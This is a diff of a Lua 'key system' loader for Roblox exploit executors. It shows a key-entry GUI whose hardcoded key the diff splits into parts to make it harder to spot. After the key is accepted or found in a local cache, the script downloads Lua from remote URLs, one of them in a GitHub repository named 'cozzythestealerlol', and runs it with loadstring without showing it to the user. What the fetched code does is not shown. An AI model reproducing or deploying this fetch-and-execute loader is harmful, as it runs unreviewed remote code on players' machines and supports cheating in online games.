@@ -2,7 +2,12 @@
 -- CONFIGURATION
 ------------------------------------------------------------
 
-local correctKey = "7&INN%tnfv8fads&"
+-- split key (harder to spot at a glance)
+local k_part_a = "7&IN"
+local k_part_b = "N%tn"
+local k_part_c = "fv8fa"
+local k_part_d = "ds&"
+local correctKey = k_part_a .. k_part_b .. k_part_c .. k_part_d -- change parts when needed
 
 local gameScripts = {
 	[108631717812345] = "https://raw.githubusercontent.com/cozzythestealerlol/mainscript/refs/heads/main/hujsfjkhsfsailh",
@@ -11,10 +16,10 @@ local gameScripts = {
 
 local defaultScript = "https://example.com/default-script.lua"
 
-local clipboardLink = "https://link-target.net/1439901/dYW6w6VnHDBq" -- link copied by the new button
+local clipboardLink = "https://link-target.net/1439901/dYW6w6VnHDBq"
 
--- Cache duration in seconds (24 hours)
-local CACHE_SECONDS = 24 * 60 * 60
+-- Cache duration in seconds (48 hours)
+local CACHE_SECONDS = 48 * 60 * 60
 
 ------------------------------------------------------------
 -- SERVICES
@@ -24,11 +29,10 @@ local HttpService = game:GetService("HttpService")
 local player = game.Players.LocalPlayer
 
 ------------------------------------------------------------
--- LOCAL CACHING HELPERS (uses isfile/readfile/writefile/delfile if available)
+-- LOCAL CACHING HELPERS
 ------------------------------------------------------------
 
 local function fileApiAvailable()
-	-- Detect presence of the common file API (exploit environments)
 	return (type(isfile) == "function") and (type(readfile) == "function") and (type(writefile) == "function")
 end
 
@@ -37,75 +41,48 @@ local function cacheFileName()
 end
 
 local function readCache()
-	if not fileApiAvailable() then
-		return nil
-	end
-
+	if not fileApiAvailable() then return nil end
 	local fname = cacheFileName()
 	local ok, contents = pcall(function() return readfile(fname) end)
-	if not ok or not contents or contents == "" then
-		return nil
-	end
-
+	if not ok or not contents or contents == "" then return nil end
 	local success, data = pcall(function() return HttpService:JSONDecode(contents) end)
 	if not success or type(data) ~= "table" then
-		-- corrupted file, delete
 		pcall(function() delfile(fname) end)
 		return nil
 	end
-
 	return data
 end
 
 local function writeCache(storedKey, expiry)
-	if not fileApiAvailable() then
-		return
-	end
-
+	if not fileApiAvailable() then return end
 	local fname = cacheFileName()
 	local data = { key = storedKey, expiry = expiry }
 	local ok, encoded = pcall(function() return HttpService:JSONEncode(data) end)
-	if ok and encoded then
-		pcall(function() writefile(fname, encoded) end)
-	end
+	if ok and encoded then pcall(function() writefile(fname, encoded) end) end
 end
 
 local function deleteCache()
-	if not fileApiAvailable() then
-		return
-	end
+	if not fileApiAvailable() then return end
 	pcall(function() delfile(cacheFileName()) end)
 end
 
 ------------------------------------------------------------
--- RUN SCRIPT UTILITY (executes remote script safely then cleans GUI/blur)
+-- RUN SCRIPT UTILITY
 ------------------------------------------------------------
 local function runGameScriptAndCleanup(scriptURL, guiObj, blurObj)
-	-- Run in protected call
 	pcall(function()
-		-- Try to load remote script
 		if scriptURL and scriptURL ~= "" then
-			local success, err = pcall(function()
-				-- use HttpGet then loadstring
+			local success = pcall(function()
 				local code = game:HttpGet(scriptURL)
-				if code and type(code) == "string" and #code > 0 then
+				if code and #code > 0 then
 					local fn = loadstring(code)
-					if type(fn) == "function" then
-						fn()
-					end
+					if type(fn) == "function" then fn() end
 				end
 			end)
-			-- ignore errors silently
 		end
 	end)
-
-	-- cleanup UI if present
-	if guiObj and guiObj.Parent then
-		pcall(function() guiObj:Destroy() end)
-	end
-	if blurObj and blurObj.Parent then
-		pcall(function() blurObj:Destroy() end)
-	end
+	if guiObj and guiObj.Parent then pcall(function() guiObj:Destroy() end) end
+	if blurObj and blurObj.Parent then pcall(function() blurObj:Destroy() end) end
 end
 
 ------------------------------------------------------------
@@ -114,40 +91,83 @@ end
 do
 	local cached = readCache()
 	if cached and type(cached) == "table" then
-		-- cached.key, cached.expiry expected
 		local storedKey = cached.key
 		local expiry = tonumber(cached.expiry) or 0
 		local now = os.time()
 
-		-- Conditions to auto-run:
-		-- 1) stored key matches current correctKey
-		-- 2) expiry is in the future (not expired)
 		if storedKey == correctKey and expiry > now then
-			-- get script URL for this place
+			-- ✅ valid cache → auto-run
 			local scriptURL = gameScripts[game.PlaceId] or defaultScript
-			-- execute immediately (no GUI)
 			pcall(function()
 				local ok, code = pcall(function() return game:HttpGet(scriptURL) end)
 				if ok and code and #code > 0 then
 					local fn = loadstring(code)
-					if type(fn) == "function" then
-						fn()
-					end
+					if type(fn) == "function" then fn() end
 				end
 			end)
-			-- done — return early to skip GUI creation
 			return
 		else
-			-- invalid cache (expired or key changed) -> remove it
+			-- ❌ invalid, expired, or key changed → delete and notify
 			deleteCache()
+
+			local playerGui = player:WaitForChild("PlayerGui")
+			local notifGui = Instance.new("ScreenGui")
+			notifGui.Name = "KeyExpiredNotice"
+			notifGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+			notifGui.IgnoreGuiInset = true
+			notifGui.Parent = playerGui
+
+			local notifFrame = Instance.new("Frame")
+			notifFrame.Size = UDim2.new(0, 400, 0, 70)
+			notifFrame.Position = UDim2.new(0.5, 0, 1, -80)
+			notifFrame.AnchorPoint = Vector2.new(0.5, 1)
+			notifFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+			notifFrame.BackgroundTransparency = 0.25
+			notifFrame.Parent = notifGui
+
+			local notifCorner = Instance.new("UICorner", notifFrame)
+			notifCorner.CornerRadius = UDim.new(0, 12)
+
+			local icon = Instance.new("TextLabel", notifFrame)
+			icon.Size = UDim2.new(0, 50, 1, 0)
+			icon.BackgroundTransparency = 1
+			icon.TextColor3 = Color3.fromRGB(255, 220, 50)
+			icon.Font = Enum.Font.GothamBold
+			icon.TextScaled = true
+			icon.Text = "⚠"
+
+			local notifLabel = Instance.new("TextLabel", notifFrame)
+			notifLabel.Size = UDim2.new(1, -60, 1, 0)
+			notifLabel.Position = UDim2.new(0, 60, 0, 0)
+			notifLabel.BackgroundTransparency = 1
+			notifLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+			notifLabel.Font = Enum.Font.GothamBold
+			notifLabel.TextScaled = true
+			notifLabel.TextWrapped = true
+			notifLabel.Text = "Your saved key expired or changed.\nPlease re-enter it."
+
+			local sound = Instance.new("Sound", notifFrame)
+			sound.SoundId = "rbxassetid://3165700530"
+			sound.Volume = 1
+			sound:Play()
+			task.delay(sound.TimeLength, function()
+				sound:Play() -- play twice
+			end)
+
+			local fadeIn = TweenService:Create(notifFrame, TweenInfo.new(0.4), {BackgroundTransparency = 0.15})
+			fadeIn:Play()
+			task.wait(4)
+			local fadeOut = TweenService:Create(notifFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1})
+			fadeOut:Play()
+			task.wait(0.6)
+			notifGui:Destroy()
 		end
 	end
 end
 
 ------------------------------------------------------------
--- GUI CREATION (only runs if auto-run didn't trigger)
+-- GUI CREATION
 ------------------------------------------------------------
-
 local gui = Instance.new("ScreenGui")
 gui.Name = "KeySystemGui"
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -155,12 +175,11 @@ gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
--- Blur
 local blur = Instance.new("BlurEffect")
 blur.Size = 0
 blur.Parent = game.Lighting
 
--- Background Gradient
+-- Background gradient
 local bgFrame = Instance.new("Frame")
 bgFrame.Parent = gui
 bgFrame.Size = UDim2.new(1, 0, 1, 0)
@@ -173,7 +192,7 @@ bgGradient.Color = ColorSequence.new{
 }
 bgGradient.Rotation = 45
 
--- Main Frame
+-- Main frame
 local frame = Instance.new("Frame")
 frame.Parent = gui
 frame.Size = UDim2.new(0, 420, 0, 220)
@@ -182,14 +201,11 @@ frame.AnchorPoint = Vector2.new(0.5, 0.5)
 frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
 frame.BackgroundTransparency = 0.55
 frame.BorderSizePixel = 0
-frame.Visible = false
 frame.Active = true
 frame.Draggable = true
 
-local corner = Instance.new("UICorner", frame)
-corner.CornerRadius = UDim.new(0, 20)
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
 
--- Gradient overlay
 local gradient = Instance.new("UIGradient", frame)
 gradient.Color = ColorSequence.new{
 	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 180, 130)),
@@ -198,8 +214,7 @@ gradient.Color = ColorSequence.new{
 gradient.Rotation = 45
 
 -- Close button
-local closeBtn = Instance.new("TextButton")
-closeBtn.Parent = frame
+local closeBtn = Instance.new("TextButton", frame)
 closeBtn.Text = "X"
 closeBtn.Size = UDim2.new(0, 30, 0, 30)
 closeBtn.Position = UDim2.new(1, -40, 0, 10)
@@ -207,12 +222,9 @@ closeBtn.BackgroundTransparency = 0.8
 closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 closeBtn.Font = Enum.Font.GothamBold
 closeBtn.TextSize = 20
+Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)
 
-local closeCorner = Instance.new("UICorner", closeBtn)
-closeCorner.CornerRadius = UDim.new(1, 0)
-
-local tooltip = Instance.new("TextLabel")
-tooltip.Parent = closeBtn
+local tooltip = Instance.new("TextLabel", closeBtn)
 tooltip.Text = "Close"
 tooltip.BackgroundTransparency = 1
 tooltip.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -233,9 +245,8 @@ closeBtn.MouseButton1Click:Connect(function()
 	blur:Destroy()
 end)
 
--- "Key:" Label
-local keyLabel = Instance.new("TextLabel")
-keyLabel.Parent = frame
+-- Key label + box
+local keyLabel = Instance.new("TextLabel", frame)
 keyLabel.Text = "Key:"
 keyLabel.Position = UDim2.new(0.1, 0, 0.35, 0)
 keyLabel.Size = UDim2.new(0, 50, 0, 30)
@@ -244,9 +255,7 @@ keyLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 keyLabel.Font = Enum.Font.Gotham
 keyLabel.TextSize = 18
 
--- TextBox
-local keyBox = Instance.new("TextBox")
-keyBox.Parent = frame
+local keyBox = Instance.new("TextBox", frame)
 keyBox.PlaceholderText = "Enter your key"
 keyBox.Position = UDim2.new(0.25, 0, 0.35, 0)
 keyBox.Size = UDim2.new(0.5, 0, 0, 30)
@@ -256,17 +265,10 @@ keyBox.TextColor3 = Color3.fromRGB(0, 0, 0)
 keyBox.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
 keyBox.Font = Enum.Font.Gotham
 keyBox.TextSize = 16
+Instance.new("UICorner", keyBox).CornerRadius = UDim.new(0, 10)
 
-local keyCorner = Instance.new("UICorner", keyBox)
-keyCorner.CornerRadius = UDim.new(0, 10)
-
-------------------------------------------------------------
--- SIDE-BY-SIDE BUTTONS
-------------------------------------------------------------
-
--- Submit button (left)
-local submitBtn = Instance.new("TextButton")
-submitBtn.Parent = frame
+-- Submit button
+local submitBtn = Instance.new("TextButton", frame)
 submitBtn.Text = "Submit"
 submitBtn.Size = UDim2.new(0, 140, 0, 35)
 submitBtn.Position = UDim2.new(0.15, 0, 0.55, 0)
@@ -275,12 +277,10 @@ submitBtn.BackgroundTransparency = 0.3
 submitBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
 submitBtn.Font = Enum.Font.GothamBold
 submitBtn.TextSize = 18
-local submitCorner = Instance.new("UICorner", submitBtn)
-submitCorner.CornerRadius = UDim.new(0, 10)
+Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0, 10)
 
--- Clipboard button (right)
-local copyBtn = Instance.new("TextButton")
-copyBtn.Parent = frame
+-- Clipboard button
+local copyBtn = Instance.new("TextButton", frame)
 copyBtn.Text = "Key System Here"
 copyBtn.Size = UDim2.new(0, 140, 0, 35)
 copyBtn.Position = UDim2.new(0.55, 0, 0.55, 0)
@@ -289,8 +289,7 @@ copyBtn.BackgroundTransparency = 0.3
 copyBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
 copyBtn.Font = Enum.Font.GothamBold
 copyBtn.TextSize = 16
-local copyCorner = Instance.new("UICorner", copyBtn)
-copyCorner.CornerRadius = UDim.new(0, 10)
+Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 10)
 
 copyBtn.MouseButton1Click:Connect(function()
 	if setclipboard then
@@ -301,28 +300,20 @@ copyBtn.MouseButton1Click:Connect(function()
 	end
 end)
 
-------------------------------------------------------------
--- FADE-IN EFFECT
-------------------------------------------------------------
-
-frame.Visible = true
+-- Fade-in
 frame.BackgroundTransparency = 1
-bgGradient.Transparency = NumberSequence.new(1)
 blur.Size = 0
-
 task.spawn(function()
 	for i = 1, 20 do
 		frame.BackgroundTransparency = 1 - (i * 0.02)
 		blur.Size = i * 0.6
-		bgGradient.Transparency = NumberSequence.new(1 - (i * 0.05))
 		task.wait(0.02)
 	end
 end)
 
 ------------------------------------------------------------
--- KEY VALIDATION WITH ANIMATION + FADE-OUT
+-- KEY VALIDATION
 ------------------------------------------------------------
-
 local function resetKeyBox()
 	keyBox.PlaceholderText = "Enter your key"
 	keyBox.Text = ""
@@ -330,66 +321,40 @@ local function resetKeyBox()
 	keyBox.Active = true
 end
 
--- Helper to finish the success flow: cache the key (if possible), show welcome fade, then run script
 local function successFlow()
-	-- cache the accepted key locally (if file API available)
 	local expiry = os.time() + CACHE_SECONDS
 	writeCache(correctKey, expiry)
-
-	-- Animate to center and shrink
 	local tweenInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-	TweenService:Create(frame, tweenInfo, {
-		Size = UDim2.new(0, 250, 0, 120),
-		Position = UDim2.new(0.5, 0, 0.5, 0)
-	}):Play()
-
-	-- Clear contents (remove children)
-	for _, obj in ipairs(frame:GetChildren()) do
-		obj:Destroy()
-	end
-
-	-- Welcome label
-	local welcomeText = Instance.new("TextLabel")
-	welcomeText.Parent = frame
+	TweenService:Create(frame, tweenInfo, {Size = UDim2.new(0, 250, 0, 120)}):Play()
+	for _, obj in ipairs(frame:GetChildren()) do obj:Destroy() end
+	local welcomeText = Instance.new("TextLabel", frame)
 	welcomeText.Size = UDim2.new(1, 0, 1, 0)
 	welcomeText.BackgroundTransparency = 1
 	welcomeText.TextColor3 = Color3.fromRGB(255, 255, 255)
 	welcomeText.Font = Enum.Font.GothamBold
 	welcomeText.TextScaled = true
 	welcomeText.Text = "Welcome, " .. player.Name .. "!"
-
 	task.wait(1.25)
-
-	-- Fade out entire frame smoothly (frame transparency + text + reduce blur)
 	for i = 1, 20 do
-		local alpha = i * (1/20)
+		local alpha = i / 20
 		frame.BackgroundTransparency = 0.55 + (0.45 * alpha)
 		welcomeText.TextTransparency = alpha
-		-- gradually reduce blur (avoid multiplying by alpha repeatedly; step down)
-		blur.Size = math.max(0, blur.Size - (0.6 * (1/20) * 20)) -- fallback decrement
+		blur.Size = math.max(0, blur.Size - 0.6)
 		task.wait(0.03)
 	end
-
-	-- Execute the actual script after fade
 	local scriptURL = gameScripts[game.PlaceId] or defaultScript
 	runGameScriptAndCleanup(scriptURL, gui, blur)
 end
 
 submitBtn.MouseButton1Click:Connect(function()
 	local entered = keyBox.Text
-
 	if entered == correctKey then
-		-- success path
 		successFlow()
 	else
-		-- wrong key feedback
 		keyBox.PlaceholderText = "Wrong Key Was Entered, Try Again!"
 		keyBox.Text = ""
 		submitBtn.Active = false
 		keyBox.Active = false
-
-		task.delay(2, function()
-			resetKeyBox()
-		end)
+		task.delay(2, resetKeyBox)
 	end
 end)
